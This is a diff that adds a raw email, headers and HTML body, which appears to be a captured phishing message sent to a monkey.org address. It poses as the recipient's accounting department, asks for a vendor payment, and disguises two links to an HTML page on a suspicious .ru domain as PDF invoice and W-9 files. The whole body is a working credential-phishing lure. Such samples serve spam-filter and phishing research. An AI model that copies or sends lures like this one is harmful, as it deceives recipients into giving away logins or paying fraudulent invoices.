@@ -1,0 +1,172 @@
+Return-Path: hosting@b-engage.com
+Delivered-To: jose@monkey.org
+X-FDA: 82179608154.17.F40130E
+Received: from snowhite.wellpointhosting.com (snowhite.wellpointhosting.com
+ [212.68.46.101])	by imf02.b.hostedemail.com (Postfix) with ESMTP id
+ C197B1A001C	for <jose@monkey.org>; Fri, 31 May 2024 19:00:55 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;	dkim=pass
+ header.d=b-engage.com header.s=default header.b=Uht3YbDT;	spf=pass
+ (imf02.b.hostedemail.com: domain of hosting@b-engage.com designates
+ 212.68.46.101 as permitted sender) smtp.mailfrom=hosting@b-engage.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1717182056;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:content-type:content-type:	
+ content-transfer-encoding:in-reply-to:references:dkim-signature;
+	bh=TQYUTJ0COQb3IYn+Aqz7KfXLbuuHlOLayGmxS9HyH5o=;
+	b=AKuEktYGAfrPAq3CGIG7giMKTDEIteWcUY07Rs2C7EHKSMLZYxWgSZn7WC6JEqv1pJ7p7W
+	0U/PJW8OINfDaMaGWxfX3d9O93YnPOxBlj6eXkSBoSSy/KH63cPsDZidUUlmvTKyxerurW
+	7Fpm/kqDTpaHPvZlpguijf4shf2HPEc=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1717182056; a=rsa-sha256;
+	cv=none;
+	b=eYaaTaFcG3hO7YpGrWGAr0EjfX6jze9c/aa9sge7MjimRwNz6IB4lKo6e3W2T2bA1MdeQ4
+	4/DXw1wnuC8el26wh3gezBH2unRiiCsFtaAKJqbapQYX+hXLX9qDeicf94nvP7rIyEz+Ak
+	6yN9mNyvf9fE7pBJr8D18sO7pzLIcJU=
+ARC-Authentication-Results: i=1;	imf02.b.hostedemail.com;	dkim=pass
+ header.d=b-engage.com header.s=default header.b=Uht3YbDT;	spf=pass
+ (imf02.b.hostedemail.com: domain of hosting@b-engage.com designates
+ 212.68.46.101 as permitted sender) smtp.mailfrom=hosting@b-engage.com;
+	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=b-engage.com; s=default; h=Message-Id:Date:Content-Type:To:Subject:From:
+	Sender:Reply-To:Cc:MIME-Version:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=TQYUTJ0COQb3IYn+Aqz7KfXLbuuHlOLayGmxS9HyH5o=; b=Uht3YbDT+evWOn4crGhw2eQrfD
+	qT+bx3fbBjsjX+DpSiq1eyHWE89uc/rk18+ptEjY5pG80fekXP4P+sRPIOCHOtfFpi16RMNvlGo+w
+	zRqtV4gB5tqehaRd17mFASJ43B1BsvupD61aESLd8bksGytsKR+n5SwBotyZd7qqivrvesbVU7VZU
+	OcxdLIoPuaMiArEiQmuOlCJ4L2yw1DUSOo79n++iLvT8zdtx9rh06OE5geaQPyfGGmCQ40XiJVceE
+	i17U469SKBMTN6fr/YrLKiWxTQhxTOu889A6+2HRsbu7TrhwzKYK5r608EX5emlha+gzw8LdNH+LH
+	N700j89A==;
+Received: from [164.90.139.80] (port=60064 helo=TINY-017CFF8B)	by
+ snowhite.wellpointhosting.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.94.2)	(envelope-from
+ <hosting@b-engage.com>)	id 1sD5P9-00FBdL-Nt	for jose@monkey.org; Fri, 31 May
+ 2024 19:47:09 +0300
+From: "WM monkey.org accounting" <hosting@b-engage.com>
+Subject: FWD : Remit Due Waste Managements Invoice on-time : 9:47:07 AM - jose
+To: <jose@monkey.org>
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 May 2024 09:47:07 -0700
+Message-Id: <20243105094707A7513E78BB$D0F65EC130@b-engage.com>
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - snowhite.wellpointhosting.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - b-engage.com
+X-Get-Message-Sender-Via:
+ snowhite.wellpointhosting.com: authenticated_id: hosting@b-engage.com
+X-Authenticated-Sender: snowhite.wellpointhosting.com: hosting@b-engage.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: C197B1A001C
+X-Stat-Signature: h8hkpzn4osozwusazax89myx93gb83tc
+X-Spam-Status: No, score=8.27
+X-Rspam-User: 
+X-HE-Tag: 1717182055-894753
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18AdJoxtyHo4TYOBo5+J5H3Xk2N6kmDRZKkwMpR1NpPxpx?=
+ =?utf-8?q?ODhZdd3U0ONAulWOBg/rhnozPVAYt0gsAAuO8Iq/xiVKyIqajZA+ZVTEFv8OGjoFM?=
+ =?utf-8?q?7ARyWGQjDdmc9tQ4nwiVnR2zTqiOmgJR0GFJH6G0S29oP+FFn+ocuavTNSQEhp8UX?=
+ =?utf-8?q?i5oe7UCbhaV6MPagicYmXVzOapJ2gbeAKGgp/KrIdXpoOAfTgY=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 164
+
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+ <title>FWD : Remit Due Waste Managements Invoice on-time : 9:47:07 AM - 
+jose</title>
+</head>
+ <body> <DIV id=:1ka class="Ar Au Ao"> <DIV aria-expanded=false 
+spellcheck=false role=textbox tabIndex=1 aria-label="Message Body" 
+aria-multiline=true aria-controls=:1t3 id=:1ke class="Am aiL Al editable 
+LW-avf tS-tW tS-tY" style="DIRECTION: ltr; MIN-HEIGHT: 376px" 
+aria-owns=:1t3 g_editable="true" itacorner="6,7:1,1,0,0"> <P 
+class=gmail-x_MsoNormal style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, 
+sans-serif; COLOR: rgb(36,36,36); MARGIN: 0in"><SPAN style="FONT-SIZE: 
+11pt; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; 
+VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; 
+PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; 
+font-kerning: inherit; font-feature-settings: inherit; 
+font-variation-settings: inherit">Will you please enter this vendor's 
+payment ?</SPAN></p><p class=gmail-x_MsoNormal style="FONT-SIZE: 12pt; 
+FONT-FAMILY: Aptos, sans-serif; COLOR: rgb(36,36,36); MARGIN: 0in">
+&nbsp;</p><p class=gmail-x_MsoNormal style="FONT-SIZE: 12pt; FONT-FAMILY: 
+Aptos, sans-serif; COLOR: rgb(36,36,36); MARGIN: 0in"><SPAN 
+style="FONT-SIZE: 11pt; BORDER-TOP: 0px; FONT-FAMILY: inherit; 
+BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; 
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 
+0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; 
+font-optical-sizing: inherit; font-kerning: inherit; 
+font-feature-settings: inherit; font-variation-settings: inherit"><A 
+href="https://req675secuere.ru/ink2/Bank&amp;RemittanceLetter.html">
+Scan_Remitdue-20240531143418.pdf</A></SPAN></p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in">&nbsp;</p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in"><SPAN style="FONT-SIZE: 11pt; BORDER-TOP: 
+0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; 
+BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; 
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; 
+font-stretch: inherit; font-optical-sizing: inherit; font-kerning: 
+inherit; font-feature-settings: inherit; font-variation-settings: 
+inherit"><A 
+href="https://req675secuere.ru/ink2/Bank&amp;RemittanceLetter.html">
+&nbsp;202405-WM - W-9 Form.pdf</A></SPAN></p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in">&nbsp;</p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in">&nbsp;</p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in"><SPAN style="FONT-SIZE: 11pt; BORDER-TOP: 
+0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; 
+BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; 
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; 
+font-stretch: inherit; font-optical-sizing: inherit; font-kerning: 
+inherit; font-feature-settings: inherit; font-variation-settings: 
+inherit">Thanks again,</SPAN></p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in">&nbsp;</p><p class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; COLOR: 
+rgb(36,36,36); MARGIN: 0in">&nbsp;</P> <DIV style="FONT-SIZE: 15px; 
+BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; 
+BORDER-BOTTOM: 0px; COLOR: rgb(36,36,36); PADDING-BOTTOM: 0px; 
+PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; 
+PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; 
+font-kerning: inherit; font-feature-settings: inherit; 
+font-variation-settings: inherit; font-variant-numeric: inherit; 
+font-variant-east-asian: inherit; font-variant-alternates: inherit; 
+font-variant-position: inherit"> <P class=gmail-x_MsoNormal 
+style="FONT-SIZE: 12pt; FONT-FAMILY: Aptos, sans-serif; MARGIN: 0in"><B>
+<SPAN style="FONT-SIZE: 14pt; BORDER-TOP: 0px; FONT-FAMILY: ; 
+BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; font-stretch: 
+inherit" Segoe Script?; font-optical-sizing: font-kerning: 
+font-feature-settings: font-variation-settings: inherit; margin: padding: 
+0px; vertical-align: baseline; color: inherit;?>Mc W. &nbsp;Cullims</SPAN>
+</B></p><p class=gmail-x_MsoNormal style="FONT-SIZE: 12pt; FONT-FAMILY: 
+Aptos, sans-serif; MARGIN: 0in"><B><SPAN style="FONT-SIZE: 11pt; 
+BORDER-TOP: 0px; FONT-FAMILY: Arial, sans-serif; BORDER-RIGHT: 0px; 
+VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; 
+PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; 
+font-kerning: inherit; font-feature-settings: inherit; 
+font-variation-settings: inherit">Head of Accounting Department</SPAN></B>
+</p><p class=gmail-x_MsoNormal style="FONT-SIZE: 12pt; FONT-FAMILY: 
+Aptos, sans-serif; MARGIN: 0in"><B><SPAN style="FONT-SIZE: 11pt; 
+BORDER-TOP: 0px; FONT-FAMILY: Arial, sans-serif; BORDER-RIGHT: 0px; 
+VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(46,116,181); 
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 
+0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; 
+font-optical-sizing: inherit; font-kerning: inherit; 
+font-feature-settings: inherit; font-variation-settings: inherit">D: 
+monkey.org Partners</SPAN></B></P></DIV></DIV></DIV></body>
+</html>
+
+
